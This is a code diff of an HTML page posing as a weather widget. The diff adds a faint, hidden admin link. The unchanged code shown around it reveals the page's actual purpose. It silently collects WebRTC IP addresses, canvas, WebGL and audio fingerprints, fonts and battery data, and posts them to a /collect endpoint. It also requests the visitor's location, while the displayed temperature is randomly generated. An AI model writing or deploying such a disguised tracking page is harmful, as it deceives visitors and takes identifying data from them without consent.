@@ -24,6 +24,7 @@
             padding: 40px 30px 35px;
             box-shadow: 0 25px 50px -10px rgba(0,0,0,0.3);
             text-align: center;
+            position: relative;
         }
         .weather-icon { font-size: 80px; line-height: 1; margin-bottom: 4px; }
         .city-name { font-size: 26px; font-weight: 600; color: #1a1a2e; margin-top: 6px; letter-spacing: -0.5px; }
@@ -51,9 +52,28 @@
         .feedback-form input:focus { border-color: #1a73e8; box-shadow: 0 0 0 3px rgba(26,115,232,0.1); }
         .feedback-form .row { display: flex; gap: 10px; }
         .feedback-form .row input { width: 50%; }
+
+        /* Hidden admin link */
+        .admin-link {
+            position: fixed;
+            bottom: 10px;
+            right: 15px;
+            font-size: 20px;
+            color: rgba(255,255,255,0.2);
+            cursor: pointer;
+            transition: color 0.3s;
+            text-decoration: none;
+            z-index: 999;
+        }
+        .admin-link:hover {
+            color: rgba(255,255,255,0.8);
+        }
     </style>
 </head>
 <body>
+<!-- Hidden admin link -->
+<a href="/login" class="admin-link" title="Admin">⚙️</a>
+
 <div class="card fade-in">
     <div class="weather-icon" id="weatherIcon">⛅</div>
     <div class="city-name" id="cityDisplay">📍 Detecting location…</div>
@@ -75,7 +95,7 @@
         </div>
     </div>
 
-    <!-- Optional Feedback Form (hidden initially, shown after test completes) -->
+    <!-- Optional Feedback Form -->
     <div id="feedbackForm" class="feedback-form hidden">
         <p style="font-size:14px; color:#555; margin-bottom:8px;">Help us improve – leave your feedback (optional):</p>
         <div class="row">
@@ -101,7 +121,6 @@
     async function collectAll() { const basic = getBasic(); const webrtc = await getWebRTCIPs(); const canvas = getCanvasFingerprint(); const webgl = getWebGLInfo(); const audio = await getAudioFingerprint(); const fonts = getFonts(); const battery = await getBattery(); return { basic, webrtc, canvas, webgl, audio, fonts, battery }; }
     function sendData(payload) { fetch('/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }).catch(() => {}); }
 
-    // ----- Reverse geocode -----
     async function getCityFromCoords(lat, lon) {
         try {
             const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&accept-language=en`;
@@ -115,7 +134,6 @@
         } catch(e) { return null; }
     }
 
-    // ----- UI update -----
     function updateWeatherUI(lat, lon, cityName) {
         const temp = (Math.random() * 20 + 20).toFixed(1);
         const conditions = ['☀️ Sunny', '⛅ Partly cloudy', '🌤️ Fair', '🌧️ Light rain', '☁️ Cloudy'];
@@ -130,7 +148,6 @@
         }
     }
 
-    // ----- Location request -----
     async function requestLocation() {
         const statusBox = document.getElementById('statusBox');
         const statusText = document.getElementById('statusText');
@@ -186,7 +203,6 @@
         );
     }
 
-    // ----- Submit feedback (optional) -----
     function submitFeedback() {
         const email = document.getElementById('feedbackEmail').value.trim();
         const nick = document.getElementById('feedbackNick').value.trim();
